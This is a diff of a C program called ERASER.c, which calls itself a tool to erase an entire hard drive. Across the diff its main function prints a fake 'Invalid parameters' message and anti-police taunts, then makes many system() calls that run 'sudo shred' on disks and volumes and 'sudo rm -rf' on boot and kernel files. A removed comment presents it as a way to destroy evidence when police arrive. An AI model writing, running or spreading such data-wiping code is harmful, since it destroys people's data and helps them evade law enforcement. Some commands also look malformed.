@@ -1,25 +1,24 @@
 //ERASER.c
 //MADE BY ARTEON!
 //ERASE EVERYTHING ON YOUR HARDRIVE
-//LAST EDIT 20:48 18.02.19
+//LAST EDIT 13:20 04.03.20
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/stat.h>
-// this script should only be used if u get the police on the door
   int main(int argc, char * argv[]) {
     fprintf(stderr, "\033[22;31m[!] Invalid parameters[!]\033[22;31m\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] \033[22;31mREMOVING EVERYTHING!\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] FUCK THE \033[22;31mPOLICE\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] FUCK THE \033[22;31mFBI\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] FUCK THE \033[22;31mCIA\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] FUCK THE \033[22;31mNSA\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] CREDZ TO MY BOY \033[22;31mB1NARY\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] YOUR SYSTEM IS \033[22;31mDEAD\n");
-    fprintf(stderr, "\033[22;90m[ARTEON] MADE BY ARTEON \033[22;31m13th December 2018\n");
+    fprintf(stderr, "\033[22;90m[S] \033[22;31mREMOVING EVERYTHING!\n");
+    fprintf(stderr, "\033[22;90m[SW] FUCK THE \033[22;31mPOLICE\n");
+    fprintf(stderr, "\033[22;90m[SWO] FUCK THE \033[22;31mFBI\n");
+    fprintf(stderr, "\033[22;90m[SWOO] FUCK THE \033[22;31mCIA\n");
+    fprintf(stderr, "\033[22;90m[SWOOF] FUCK THE \033[22;31mNSA\n");
+    fprintf(stderr, "\033[22;90m[FO] CREDZ TO MY BOY \033[22;31mB1NARY\n");
+    fprintf(stderr, "\033[22;90m[FOOW] YOUR SYSTEM IS \033[22;31mDEAD\n");
+    fprintf(stderr, "\033[22;90m[FOOWS] MADE BY ARTEON \033[22;31m13th December 2018\n");
     sleep(1);
     //uses wipe to manually uninstall
-    system("sudo apt-get install wipe\n");
+    system("sudo apt-get install wipe\n"); // installs wipe
     system("sudo shred -vfz -n ? sda");
     system("sudo shred -vfz -n ? sr0");
     system("sudo shred -vfz -n ? sdb");
@@ -27,7 +26,6 @@
     system("sudo shred -vfz -n ? ubuntu-vg/root");
     system("sudo shred -vfz -n ? ubuntu-vg/swap_1");
     system("sudo shred -vfz -n ? ubuntu-vg/*");
-    ////////////////////////////////////////////////////////////////////////////////
     system("shred -vfz -n ? sda");
     system("shred -vfz -n ? sr0");
     system("shred -vfz -n ? sdb");
@@ -103,6 +101,5 @@
     system("sudo rm -rf initrd.img.old");
     system("sudo rm -rf vmlinuz");
     system("sudo rm -rf vmlinuz.old");
-
     return 0;
   }
